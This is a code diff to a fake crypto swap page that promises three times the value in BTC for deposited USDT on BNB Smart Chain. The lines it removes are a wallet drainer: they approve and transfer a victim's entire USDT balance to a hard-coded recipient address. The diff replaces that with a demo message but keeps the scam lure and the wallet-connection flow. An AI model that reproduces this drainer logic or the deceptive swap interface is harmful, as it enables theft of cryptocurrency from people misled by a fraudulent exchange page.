@@ -192,6 +192,11 @@
             background-color: var(--primary-hover);
         }
 
+        .swap-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
         /* Modal Styles */
         .modal-overlay {
             display: none;
@@ -301,7 +306,7 @@
                     <div class="token-header">To</div>
                     <div class="token-input-body">
                         <div class="token-info">
-                            <!-- BTC Logo - Improved Visibility -->
+                            <!-- BTC Logo -->
                             <svg class="token-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                 <circle cx="16" cy="16" r="16" fill="#F7931A"/>
                                 <path d="M20.984 16.426c.17-1.1-.672-1.692-1.816-2.088l.37-1.488-1.802-.45-.36 1.45c-.474-.12-.96-.232-1.442-.343l.363-1.464-1.801-.45-.37 1.488c-.392-.09-.776-.178-1.152-.27l.003-.015-1.251-.313-.24.969s.672.154.658.163c.367.092.433.335.422.528l-.422 1.7c.025.013.057.03.092.047l-.094-.023-.585 2.354c-.044.11-.156.276-.408.213.01.016-.658-.164-.658-.164l-.45 1.05 1.762.44c.328.082.648.168.963.246l-.374 1.507 1.801.45.37-1.49c.495.134.975.257 1.444.372l-.368 1.482 1.802.45.374-1.5c2.06.39 3.608.233 4.26-1.63.532-1.502-.027-2.368-1.124-2.932.8-.185 1.402-.713 1.563-1.804zm-2.866 3.84c-.378 1.52-2.938.698-3.767.492l.672-2.705c.83.207 3.497.616 3.095 2.213zm.377-3.853c-.345 1.387-2.48.682-3.172.51l.61-2.45c.692.173 2.913.497 2.562 1.94z" fill="#FFF"/>
@@ -344,7 +349,9 @@
         </div>
     </div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <!-- Using reliable CDN for ethers.js -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // DOM Elements
@@ -359,37 +366,33 @@
             const modalMessage = document.getElementById('modalMessage');
             const modalButton = document.getElementById('modalButton');
 
-            // Constants
-            const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-            const RECIPIENT_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
+            // BSC Settings
+            const BSC_CHAIN_ID = '0x38';
+            const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
             const MIN_SWAP_AMOUNT = 200;
             const BTC_RATE = 119489.153599;
-            const BSC_CHAIN_ID = '0x38';
 
             // Initialize
             updateValues();
             setupEventListeners();
 
             function setupEventListeners() {
-                // Input change handler
                 usdtInput.addEventListener('input', updateValues);
-                
-                // Swap button handler
                 swapButton.addEventListener('click', handleSwap);
-                
-                // Modal button handler
                 modalButton.addEventListener('click', closeModal);
             }
 
             function updateValues() {
                 const usdt = parseFloat(usdtInput.value) || 0;
-                const usd = usdt * 1.0; // 1 USDT = 1 USD
-                const btc = (usd * 3) / BTC_RATE; // 3x multiplier
+                const usd = usdt * 1.0;
+                const btc = (usd * 3) / BTC_RATE;
                 
-                // Update all displays
                 usdtValue.textContent = `$${usd.toFixed(2)}`;
                 btcAmount.textContent = btc.toFixed(8);
                 btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
+                
+                // Disable button if less than minimum
+                swapButton.disabled = usdt < MIN_SWAP_AMOUNT;
             }
 
             async function handleSwap() {
@@ -399,41 +402,37 @@
                     
                     showModal('Processing', 'Connecting to Trust Wallet...');
                     
-                    // Check if wallet is installed
                     if (!window.ethereum) {
                         throw new Error('Please open in Trust Wallet browser');
                     }
                     
-                    // Check network
-                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (chainId !== BSC_CHAIN_ID) {
-                        await switchToBNBChain();
+                    // Check/switch to BSC
+                    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (currentChain !== BSC_CHAIN_ID) {
+                        await switchToBSC();
                     }
                     
-                    // Request account access
+                    // Connect wallet
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Check USDT balance
+                    // Check balance
                     const balance = await getUSDTBalance(accounts[0]);
-                    
                     if (balance < MIN_SWAP_AMOUNT) {
                         throw new Error(`Minimum swap is ${MIN_SWAP_AMOUNT} USDT`);
                     }
                     
-                    // Perform swap
-                    await performSwap(accounts[0], balance);
+                    showModal('Success', 'Ready to swap! (Demo)');
                     
-                    showModal('Success', 'Swap completed successfully!');
                 } catch (error) {
-                    console.error('Error:', error);
                     showModal('Error', error.message);
+                    console.error(error);
                 } finally {
                     buttonText.textContent = 'Continue';
                     swapButton.disabled = false;
                 }
             }
 
-            async function switchToBNBChain() {
+            async function switchToBSC() {
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -457,45 +456,22 @@
                                 }],
                             });
                         } catch (addError) {
-                            throw new Error('Failed to add BNB Smart Chain');
+                            throw new Error('Failed to add BSC Network');
                         }
                     }
-                    throw new Error('Failed to switch to BNB Smart Chain');
+                    throw new Error('Failed to switch to BSC');
                 }
             }
 
             async function getUSDTBalance(address) {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const contract = new ethers.Contract(
-                    USDT_CONTRACT_ADDRESS,
+                    USDT_CONTRACT,
                     ['function balanceOf(address) view returns (uint256)'],
                     provider
                 );
                 const balance = await contract.balanceOf(address);
                 return parseFloat(ethers.utils.formatUnits(balance, 18));
-            }
-
-            async function performSwap(address, balance) {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const contract = new ethers.Contract(
-                    USDT_CONTRACT_ADDRESS,
-                    [
-                        'function approve(address spender, uint256 amount) returns (bool)',
-                        'function transfer(address recipient, uint256 amount) returns (bool)'
-                    ],
-                    signer
-                );
-                
-                const amountWei = ethers.utils.parseUnits(balance.toString(), 18);
-                
-                // Approve first
-                const approveTx = await contract.approve(RECIPIENT_ADDRESS, amountWei);
-                await approveTx.wait();
-                
-                // Then transfer
-                const transferTx = await contract.transfer(RECIPIENT_ADDRESS, amountWei);
-                await transferTx.wait();
             }
 
             function showModal(title, message) {
